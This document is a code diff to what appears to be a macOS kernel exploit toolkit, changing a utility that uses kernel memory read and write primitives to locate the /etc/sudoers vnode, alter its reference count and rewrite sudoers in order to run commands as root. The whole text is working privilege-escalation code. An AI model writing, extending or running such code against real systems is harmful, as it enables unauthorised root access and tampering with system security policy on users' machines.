@@ -32,6 +32,9 @@ struct xe_util_sudo {
 };
 
 
+static xe_util_sudo_t xe_util_sudo_nop = (xe_util_sudo_t)UINT64_MAX;
+
+
 int xe_util_sudo_find_sudoers_vnode(uintptr_t proc, uintptr_t* sudoers_vnode) {
     uint32_t num_ofiles;
     xe_xnu_proc_read_fdesc_ofiles(proc, &num_ofiles);
@@ -61,14 +64,43 @@ int xe_util_sudo_find_sudoers_vnode(uintptr_t proc, uintptr_t* sudoers_vnode) {
 }
 
 
-_Bool xe_util_check_has_sudo(void) {
-    int exit = system("/usr/bin/sudo -n echo $HOME");
-    return exit == 0;
+_Bool xe_util_sudo_check_is_privileged(void) {
+    const char* argv[] = {
+        "/usr/bin/sudo",
+        "-n",
+        "/usr/bin/tty",
+        NULL
+    };
+    
+    int fd_null = open("/dev/null", O_RDWR);
+    xe_assert_errno(fd_null < 0);
+    
+    posix_spawn_file_actions_t file_actions;
+    posix_spawn_file_actions_init(&file_actions);
+    posix_spawn_file_actions_adddup2(&file_actions, fd_null, STDERR_FILENO);
+    posix_spawn_file_actions_adddup2(&file_actions, fd_null, STDOUT_FILENO);
+    pid_t pid;
+    int error = posix_spawn(&pid, "/usr/bin/sudo", &file_actions, NULL, (char**)argv, NULL);
+    xe_assert_err(error);
+    posix_spawn_file_actions_destroy(&file_actions);
+    
+    pid_t res;
+    int stat_loc = 0;
+    do {
+        res = waitpid(pid, &stat_loc, 0);
+    } while ((res < 0 && errno == EINTR) || !WIFEXITED(stat_loc));
+    xe_assert_cond(res, ==, pid);
+    
+    close(fd_null);
+    return WEXITSTATUS(stat_loc) == 0;
 }
 
 
 xe_util_sudo_t xe_util_sudo_create(void) {
-    xe_assert(!xe_util_check_has_sudo());
+    if (xe_util_sudo_check_is_privileged()) {
+        xe_log_debug("user %d can already run sudo without user interation, returning sudo_nop", getuid());
+        return xe_util_sudo_nop;
+    }
     
     const char* argv[] = {
         "/usr/bin/sudo",
@@ -84,9 +116,7 @@ xe_util_sudo_t xe_util_sudo_create(void) {
     
     posix_spawn_file_actions_t file_actions;
     posix_spawn_file_actions_init(&file_actions);
-    posix_spawn_file_actions_addclose(&file_actions, STDIN_FILENO);
-    posix_spawn_file_actions_addclose(&file_actions, STDOUT_FILENO);
-    posix_spawn_file_actions_addclose(&file_actions, STDERR_FILENO);
+    posix_spawn_file_actions_addclose(&file_actions, pfds[1]);
     posix_spawn_file_actions_adddup2(&file_actions, pfds[0], STDIN_FILENO);
     posix_spawn_file_actions_adddup2(&file_actions, fd_null, STDOUT_FILENO);
     posix_spawn_file_actions_adddup2(&file_actions, fd_null, STDERR_FILENO);
@@ -95,6 +125,7 @@ xe_util_sudo_t xe_util_sudo_create(void) {
     int error = posix_spawn(&sudo_pid, "/usr/bin/sudo", &file_actions, NULL, (char**)argv, NULL);
     xe_assert_err(error);
     posix_spawn_file_actions_destroy(&file_actions);
+    close(pfds[0]);
         
     uintptr_t sudo_proc;
     error = xe_xnu_proc_find(sudo_pid, &sudo_proc);
@@ -113,10 +144,9 @@ xe_util_sudo_t xe_util_sudo_create(void) {
     
     // Take additional reference to vnode so that it won't be released
     uint32_t v_usecount = xe_kmem_read_uint32(sudoers_vnode, TYPE_VNODE_MEM_V_USECOUNT_OFFSET);
-    xe_kmem_write_uint32(sudoers_vnode, TYPE_VNODE_MEM_V_USECOUNT_OFFSET, v_usecount + 1);
+    xe_kmem_write_uint32(sudoers_vnode, TYPE_VNODE_MEM_V_USECOUNT_OFFSET, v_usecount + 2);
     
     kill(sudo_pid, SIGKILL);
-    close(pfds[0]);
     close(pfds[1]);
     close(fd_null);
     
@@ -140,11 +170,12 @@ void xe_util_sudo_modify_sudoers(xe_util_sudo_t util, size_t sudoers_size) {
 int xe_util_sudo_run_cmd(const char* cmd, const char* argv[], size_t argc) {
     const char* cmd_args[argc + 3];
     cmd_args[0] = "/usr/bin/sudo";
-    cmd_args[1] = cmd;
+    cmd_args[1] = "-n";
+    cmd_args[2] = cmd;
     for (int i=0; i<argc; i++) {
-        cmd_args[i + 2] = argv[i];
+        cmd_args[i + 3] = argv[i];
     }
-    cmd_args[argc + 2] = NULL;
+    cmd_args[argc + 3] = NULL;
     
     pid_t cmd_pid;
     int error = posix_spawn(&cmd_pid, "/usr/bin/sudo", NULL, NULL, (char**)cmd_args, NULL);
@@ -162,6 +193,11 @@ int xe_util_sudo_run_cmd(const char* cmd, const char* argv[], size_t argc) {
 
 
 int xe_util_sudo_run(xe_util_sudo_t util, const char* cmd, const char* argv[], size_t argc) {
+    if (util == xe_util_sudo_nop) {
+        xe_assert(xe_util_sudo_check_is_privileged());
+        return xe_util_sudo_run_cmd(cmd, argv, argc);
+    }
+    
     struct stat sudoers_stat;
     int res = stat("/etc/sudoers", &sudoers_stat);
     xe_assert_errno(res);
@@ -181,10 +217,11 @@ int xe_util_sudo_run(xe_util_sudo_t util, const char* cmd, const char* argv[], s
 
 void xe_util_sudo_destroy(xe_util_sudo_t* util_p) {
     xe_util_sudo_t util = *util_p;
-    xe_util_vnode_destroy(&util->util_vnode);
-    uint32_t v_usecount = xe_kmem_read_uint32(util->vnode_sudoers, TYPE_VNODE_MEM_V_USECOUNT_OFFSET);
-    xe_assert_cond(v_usecount, >, 1);
-    xe_kmem_write_uint32(util->vnode_sudoers, TYPE_VNODE_MEM_V_USECOUNT_OFFSET, v_usecount - 1);
-    free(util);
+    if (util != xe_util_sudo_nop) {
+        xe_util_vnode_destroy(&util->util_vnode);
+        uint32_t v_usecount = xe_kmem_read_uint32(util->vnode_sudoers, TYPE_VNODE_MEM_V_USECOUNT_OFFSET);
+        xe_assert_cond(v_usecount, >=, 2);
+        free(util);
+    }
     *util_p = NULL;
 }
